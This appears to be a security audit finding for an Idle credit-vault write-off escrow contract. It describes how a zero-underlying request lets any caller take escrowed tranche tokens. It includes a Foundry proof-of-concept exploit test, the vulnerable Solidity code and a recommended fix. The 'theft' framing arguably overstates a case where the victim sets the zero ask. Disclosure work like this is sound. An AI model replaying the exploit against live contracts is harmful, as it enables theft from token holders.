### Title
Zero-consideration write-off requests allow theft of escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` rejects zero tranche amounts but accepts `underlyingsRequested == 0`, while `fullfillWriteOffRequest` permits any caller to fulfill that request by paying zero underlying and receiving all escrowed tranche tokens. This creates a zero-consideration order that an arbitrary EOA can immediately settle, permanently taking the victim’s tranche tokens without approval, collateral, or a privileged role. [1](#0-0) [2](#0-1) 

### Finding Description
During a running epoch, a tranche holder calling `createWriteOffRequest(amount, 0)` transfers `amount` tranche tokens into escrow and records a request whose required underlying payment remains zero. [1](#0-0) 

`fullfillWriteOffRequest` is explicitly callable by any wallet and only requires `_underlyings >= currentRequest.underlyings`; when the recorded request is zero, passing `_underlyings = 0` satisfies that check. [3](#0-2) 

The function then deletes the request, performs a zero-value `safeTransferFrom`, calculates a zero exit fee, and transfers the full `_tranches` amount to the attacker. [4](#0-3) 

This is analogous to the external null-free bug class: the tranche amount is checked for the “empty” case, but the paired consideration field is not, leaving an invalid zero-valued state that the settlement path treats as valid. [5](#0-4) 

### Impact Explanation
An unprivileged attacker can permanently acquire all tranche tokens escrowed in any request whose underlying ask is zero, paying no underlying and receiving no fee deduction. The victim’s loss equals the full escrowed tranche amount, while the attacker’s required underlying expenditure is zero. [6](#0-5) 

The theft is atomic and does not depend on borrower default, token-price manipulation, privileged permissions, reentrancy, or a balance/allowance from the attacker beyond the ability to call the function. [7](#0-6) 

### Likelihood Explanation
The vulnerable sequence requires a lender to submit a write-off request with a zero underlying ask while an epoch is running; creation is otherwise unrestricted to any tranche holder. Once such a request exists, fulfillment is permissionless and can be performed atomically by the first EOA that observes it. [8](#0-7) [3](#0-2) 

Neither `nonReentrant`, the request-matching check, nor the exit-fee logic prevents this outcome because all of those mechanisms execute normally for a zero-value payment. [2](#0-1) 

### Recommendation
Reject zero-value write-off requests in `createWriteOffRequest` by requiring both `amount != 0` and `underlyingsRequested != 0` before accepting the tranche deposit. As defense in depth, `fullfillWriteOffRequest` should also reject `currentRequest.underlyings == 0` or require `_underlyings > 0`, so legacy or otherwise-corrupted zero-consideration requests cannot be settled as valid sales. [1](#0-0) [2](#0-1) 

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, which already forks mainnet, initializes the escrow, and approves the escrow for LP’s tranche tokens. [9](#0-8) 

```solidity
function testZeroAskRequestCanBeTakenForFree() external {
  address attacker = makeAddr("zeroAskAttacker");
  uint256 stolenTranches = 1e18;

  uint256 victimTranchesBefore = tranche.balanceOf(LP);
  uint256 attackerTranchesBefore = tranche.balanceOf(attacker);
  uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

  // The victim escrows tranche tokens but records a zero underlying ask.
  vm.prank(LP);
  escrow.createWriteOffRequest(stolenTranches, 0);

  (uint256 requestTranches, uint256 requestUnderlyings) =
    escrow.userRequests(LP);
  assertEq(requestTranches, stolenTranches);
  assertEq(requestUnderlyings, 0);

  // No underlying approval or balance is needed for the zero transferFrom.
  vm.prank(attacker);
  escrow.fullfillWriteOffRequest(LP, stolenTranches, 0);

  assertEq(tranche.balanceOf(attacker) - attackerTranchesBefore, stolenTranches);
  assertEq(attackerUnderlyingBefore, underlying.balanceOf(attacker));
  assertEq(tranche.balanceOf(LP), victimTranchesBefore - stolenTranches);

  (requestTranches, requestUnderlyings) = escrow.userRequests(LP);
  assertEq(requestTranches, 0);
  assertEq(requestUnderlyings, 0);
}
```

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
